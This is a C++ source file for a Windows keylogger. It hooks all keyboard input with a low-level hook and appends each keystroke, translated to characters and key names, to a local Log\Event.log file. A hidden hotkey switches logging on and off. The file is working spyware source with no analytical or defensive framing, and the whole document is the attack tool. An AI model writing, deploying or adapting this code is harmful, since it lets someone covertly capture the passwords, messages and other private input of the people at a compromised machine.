// Keylogger.cpp : Defines the entry point for the application.
//
#pragma once

#include "stdafx.h"
#include "Keylogger.h"

#include <windows.h>
#include <winuser.h>
#include <stdio.h>

// function to check caps lock
int isCapsLock()
{
	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
		return 1;
	else
		return 0;
}



LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	
	KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
	FILE *file;
	char val[5];
	DWORD dwMsg = 1;
	file = fopen("Log\\Event.log", "a+");
	switch (wParam)
	{

	case WM_KEYDOWN: 
	{
		// Assign virtual key code to local variable
DWORD vkCode = pKeyBoard->vkCode;

		if ((vkCode >= 39) && (vkCode <= 64)) // Keys 0-9
		{

			if (GetAsyncKeyState(VK_SHIFT)) // Check if shift key is down (fairly accurate)
			{
				switch (vkCode) // 0x30-0x39 is 0-9 respectively
				{
				case 0x30:
					fputs(")", file);
					break;
				case 0x31:
					fputs("!", file);
					break;
				case 0x32:
					fputs("@", file);
					break;
				case 0x33:
					fputs("#", file);
					break;
				case 0x34:
					fputs("$", file);
					break;
				case 0x35:
					fputs("%", file);
					break;
				case 0x36:
					fputs("^", file);
					break;
				case 0x37:
					fputs("&", file);
					break;
				case 0x38:
					fputs("*", file);
					break;
				case 0x39:
					fputs("(", file);
					break;
				}
			}
			else // If shift key is not down
			{
				sprintf(val, "%c", vkCode);
				fputs(val, file);
			}
		}
		else if ((vkCode>64) && (vkCode<91)) // Keys a-z
		{
			if (!(GetAsyncKeyState(VK_SHIFT) ^ isCapsLock())) 
			{
				vkCode += 32; 
			}
			sprintf(val, "%c", vkCode);
			fputs(val, file);
		}
		else
		{
			switch (vkCode) // Check for other keys
			{
			case VK_RETURN:
				fputs("\n", file);
				break;
			case VK_TAB:
				fputs("[TAB]", file);
				break;
			case VK_RBUTTON:
				fputs("[R CLICK]", file);
				break;
			case VK_LBUTTON:
				fputs("[L CLICK]", file);
				break;
			case VK_SPACE:
				fputs(" ", file);
				break;
			case VK_LCONTROL:
			case VK_RCONTROL:
				fputs("[Ctrl]", file);
				break;
			case VK_LMENU:
			case VK_RMENU:
				fputs("[Alt]", file);
				break;
			case VK_INSERT:
				fputs("[Insert]", file);
				break;
			case VK_DELETE:
				fputs("[Del]", file);
				break;
			case VK_NUMPAD0:
				fputs("0", file);
				break;
			case VK_NUMPAD1:
				fputs("1", file);
				break;
			case VK_NUMPAD2:
				fputs("2", file);
				break;
			case VK_NUMPAD3:
				fputs("3", file);
				break;
			case VK_NUMPAD4:
				fputs("4", file);
				break;
			case VK_NUMPAD5:
				fputs("5", file);
				break;
			case VK_NUMPAD6:
				fputs("6", file);
				break;
			case VK_NUMPAD7:
				fputs("7", file);
				break;
			case VK_NUMPAD8:
				fputs("8", file);
				break;
			case VK_NUMPAD9:
				fputs("9", file);
				break;
			case VK_OEM_2:
				if (GetAsyncKeyState(VK_SHIFT))
					fputs("?", file);
				else
					fputs("/", file);
				break;
			case VK_OEM_3:
				if (GetAsyncKeyState(VK_SHIFT))
					fputs("~", file);
				else
					fputs("`", file);
				break;
			case VK_OEM_4:
				if (GetAsyncKeyState(VK_SHIFT))
					fputs("{", file);
				else
					fputs("[", file);
				break;
			case VK_OEM_5:
				if (GetAsyncKeyState(VK_SHIFT))
					fputs("|", file);
				else
					fputs("\\", file);
				break;
			case VK_OEM_6:
				if (GetAsyncKeyState(VK_SHIFT))
					fputs("}", file);
				else
					fputs("]", file);
				break;
			case VK_OEM_7:
				if (GetAsyncKeyState(VK_SHIFT))
					fputs("\\", file);
				else
					fputs("'", file);
				break;
			case VK_LSHIFT:
			case VK_RSHIFT:
				// do nothing;
				break;
			case 0xBC:                //comma       
				if (GetAsyncKeyState(VK_SHIFT))
					fputs("<", file);
				else
					fputs(",", file);
				break;
			case 0xBE:              //Period
				if (GetAsyncKeyState(VK_SHIFT))
					fputs(">", file);
				else
					fputs(".", file);
				break;
			case 0xBA:              //Semi Colon same as VK_OEM_1
				if (GetAsyncKeyState(VK_SHIFT))
					fputs(":", file);
				else
					fputs(";", file);
				break;
			case 0xBD:              //Minus
				if (GetAsyncKeyState(VK_SHIFT))
					fputs("_", file);
				else
					fputs("-", file);
				break;
			case 0xBB:              //Equal
				if (GetAsyncKeyState(VK_SHIFT))
					fputs("+", file);
				else
					fputs("=", file);
				break;
			default:

				dwMsg += pKeyBoard->scanCode << 16;
				dwMsg += pKeyBoard->flags << 24;

				WCHAR key[16];
				
				GetKeyNameText(dwMsg, key, 15);
				fputws(key, file);
				break;
			}
		}
	}
	default:

		fclose(file);
		return CallNextHookEx(NULL, nCode, wParam, lParam);
	}
	fclose(file);
	return 0;
}



int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR    lpCmdLine,
	_In_ int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

	HHOOK hKeyHook;

	CreateDirectory(L"Log", NULL);

	bool flag = TRUE;
	
	HINSTANCE hExe = GetModuleHandle(NULL);

	if (hExe == NULL)
	{
		return 1;
	}
	else
	{
		
		hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardProc, hExe, 0);
		
		RegisterHotKey(NULL, 1, MOD_ALT | MOD_CONTROL | MOD_SHIFT , 0x1B);

		SetTimer(NULL, 1000, 10000, (TIMERPROC)NULL);

		MSG msg;
		
		while (GetMessage(&msg, NULL, 0, 0) != 0)
		{
			if (msg.message == WM_HOTKEY && flag==TRUE)
			{
				
				UnhookWindowsHookEx(hKeyHook);
				flag = FALSE;
			}
			else
				if (msg.message == WM_HOTKEY && flag == FALSE)
				{
					hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardProc, hExe, 0);
					flag = TRUE;
				}
			
			TranslateMessage(&msg);
			
			DispatchMessage(&msg);
		}

		UnhookWindowsHookEx(hKeyHook);
	}
	return 0;
}
